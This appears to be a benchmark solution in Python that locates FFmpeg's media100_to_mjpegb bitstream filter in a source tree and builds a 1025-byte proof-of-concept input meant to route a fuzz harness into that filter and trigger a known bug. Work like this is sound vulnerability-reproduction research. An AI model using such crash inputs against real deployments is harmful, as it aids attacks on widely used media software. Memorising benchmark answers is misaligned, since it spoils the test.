import os
import re
import tarfile
from typing import Optional, Tuple


class Solution:
    def _find_in_tar(self, src_path: str, pattern: str) -> Optional[Tuple[str, str]]:
        """
        Search in a tarball for a C/C++/header file whose content matches the regex `pattern`.
        Returns a tuple (member_name, content) for the first match, or None if not found.
        """
        try:
            with tarfile.open(src_path, "r:*") as tar:
                for member in tar.getmembers():
                    if not member.isfile():
                        continue
                    name_lower = member.name.lower()
                    if not (name_lower.endswith(".c") or name_lower.endswith(".cc") or
                            name_lower.endswith(".cpp") or name_lower.endswith(".h")):
                        continue
                    f = tar.extractfile(member)
                    if f is None:
                        continue
                    try:
                        data = f.read().decode("utf-8", errors="ignore")
                    except Exception:
                        continue
                    if re.search(pattern, data):
                        return member.name, data
        except tarfile.ReadError:
            pass
        return None

    def _find_in_dir(self, src_path: str, pattern: str) -> Optional[Tuple[str, str]]:
        """
        Fallback if src_path is a directory rather than a tarball.
        """
        if not os.path.isdir(src_path):
            return None
        prog = re.compile(pattern)
        for root, _, files in os.walk(src_path):
            for fn in files:
                fn_low = fn.lower()
                if not (fn_low.endswith(".c") or fn_low.endswith(".cc") or
                        fn_low.endswith(".cpp") or fn_low.endswith(".h")):
                    continue
                full = os.path.join(root, fn)
                try:
                    with open(full, "r", encoding="utf-8", errors="ignore") as fh:
                        data = fh.read()
                except Exception:
                    continue
                if prog.search(data):
                    rel = os.path.relpath(full, src_path)
                    return rel, data
        return None

    def _locate_bsf_array_source(self, src_path: str) -> Optional[str]:
        """
        Locate the source text that contains the BSF descriptor array entry for media100_to_mjpegb.
        We search for a struct-style initializer: { "media100_to_mjpegb", ... }.
        """
        pattern = r'\{\s*"media100_to_mjpegb"\s*,'
        found = self._find_in_tar(src_path, pattern)
        if not found:
            found = self._find_in_dir(src_path, pattern)
        if not found:
            return None
        _, data = found
        return data

    def _extract_filter_index_and_sel_offset(self, source: str) -> Tuple[Optional[int], int]:
        """
        From the source code containing `{ "media100_to_mjpegb", ... }` parse:
        - filter_index: index of this entry within its array
        - sel_offset: byte offset in fuzz input used to select the array index (if detectable)
        """
        # Locate the struct entry `{ "media100_to_mjpegb", ... }`
        m_entry = re.search(r'\{\s*"media100_to_mjpegb"\s*,', source)
        if not m_entry:
            return None, 0
        entry_pos = m_entry.start()

        # Heuristically find the start of the array initializer: look for the '=' before entry
        eq_pos = source.rfind("=", 0, entry_pos)
        if eq_pos == -1:
            return None, 0

        # Find the opening brace '{' of the array initializer after '='
        brace_pos = source.find("{", eq_pos)
        if brace_pos == -1 or brace_pos > entry_pos:
            return None, 0

        # Find the end of the initializer '};' after the entry
        end_pos = source.find("};", entry_pos)
        if end_pos == -1:
            return None, 0

        arr_text = source[brace_pos:end_pos]

        # Extract BSF names from struct entries of the form { "name", ... }
        names = re.findall(r'\{\s*"([^"]+)"\s*,', arr_text)
        if not names:
            return None, 0

        try:
            filter_index = names.index("media100_to_mjpegb")
        except ValueError:
            return None, 0

        # Try to infer the array variable name to locate selection offset (optional)
        array_name = None
        pre_eq = source[:eq_pos]
        bracket_pos = pre_eq.rfind("[")
        if bracket_pos != -1:
            j = bracket_pos - 1
            while j >= 0 and pre_eq[j].isspace():
                j -= 1
            end = j + 1
            while j >= 0 and (pre_eq[j].isalnum() or pre_eq[j] == "_"):
                j -= 1
            start = j + 1
            candidate = pre_eq[start:end].strip()
            if candidate:
                array_name = candidate

        sel_offset = 0
        if array_name:
            # Typical pattern: data[0] % FF_ARRAY_ELEMS(array_name)
            pattern_sel = r'data\s*\[(\d+)\]\s*%\s*FF_ARRAY_ELEMS\s*\(\s*' + re.escape(array_name) + r'\s*\)'
            m_sel = re.search(pattern_sel, source)
            if m_sel:
                try:
                    sel_offset = int(m_sel.group(1))
                except ValueError:
                    sel_offset = 0

        return filter_index, sel_offset

    def solve(self, src_path: str) -> bytes:
        # Attempt to locate the BSF descriptor array that contains media100_to_mjpegb
        source = self._locate_bsf_array_source(src_path)
        filter_index: Optional[int] = None
        sel_offset: int = 0

        if source is not None:
            filter_index, sel_offset = self._extract_filter_index_and_sel_offset(source)

        # Fallback selection offset sanity
        if sel_offset < 0 or sel_offset > 4096:
            sel_offset = 0

        # Choose PoC length. Use ground-truth length as a good default.
        length = 1025

        # Build a non-trivial pattern to maximize chance of driving code paths.
        poc = bytearray(length)
        for i in range(length):
            poc[i] = (i * 17 + 31) & 0xFF

        # If we discovered the filter index, place it at the inferred selection offset.
        if filter_index is not None:
            if sel_offset >= length:
                # Ensure buffer large enough; grow conservatively if needed
                extra = sel_offset + 1 - length
                poc.extend(b"\x00" * extra)
                length = len(poc)
            poc[sel_offset] = filter_index & 0xFF

        return bytes(poc)